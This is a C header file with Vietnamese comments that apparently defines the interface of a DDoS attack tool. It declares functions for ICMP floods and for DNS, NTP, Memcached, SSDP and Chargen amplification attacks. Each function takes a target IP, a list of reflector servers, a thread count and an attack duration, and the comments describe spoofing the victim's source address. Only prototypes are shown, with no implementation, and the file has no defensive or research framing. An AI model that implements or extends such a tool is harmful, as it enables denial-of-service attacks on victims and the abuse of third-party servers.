/**
 * ddos_layer3.h
 * Khai bao prototype cho cac ham DDoS tang mang (Layer 3)
 */

#ifndef DDOS_LAYER3_H
#define DDOS_LAYER3_H

/**
 * ICMP Flood (Ping Flood)
 * Gui nhieu goi tin ICMP Echo Request den muc tieu
 * Dau vao: ip_muc_tieu - dia chi IP muc tieu
 *          kich_thuoc_goi - kich thuoc moi goi ICMP
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian tan cong (giay)
 * Tra ve: so goi tin da gui
 */
int icmp_flood(const char* ip_muc_tieu, int kich_thuoc_goi, int so_thread, int thoi_gian);

/**
 * DNS Amplification Attack
 * Gui query DNS den cac resolver voi IP nguon gia mao
 * Dau vao: ip_muc_tieu - IP cua nan nhan (se bi tan cong)
 *          danh_sach_resolver - danh sach DNS resolver
 *          so_resolver - so luong resolver
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian (giay)
 * Tra ve: so query da gui
 */
int dns_amplification(const char* ip_muc_tieu, const char** danh_sach_resolver,
                      int so_resolver, int so_thread, int thoi_gian);

/**
 * NTP Amplification Attack
 * Gui monlist request den NTP server voi IP nguon gia mao
 */
int ntp_amplification(const char* ip_muc_tieu, const char** danh_sach_ntp,
                      int so_ntp, int so_thread, int thoi_gian);

/**
 * Memcached Amplification Attack
 * Gui stats command den Memcached server voi IP nguon gia mao
 */
int memcached_amplification(const char* ip_muc_tieu, const char** danh_sach_memcached,
                            int so_memcached, int so_thread, int thoi_gian);

/**
 * SSDP Amplification Attack
 * Gui M-SEARCH request den thiet bi UPnP
 */
int ssdp_amplification(const char* ip_muc_tieu, int so_thread, int thoi_gian);

/**
 * Chargen Amplification Attack
 * Gui request den Chargen service (port 19)
 */
int chargen_amplification(const char* ip_muc_tieu, const char** danh_sach_chargen,
                          int so_chargen, int so_thread, int thoi_gian);

#endif /* DDOS_LAYER3_H */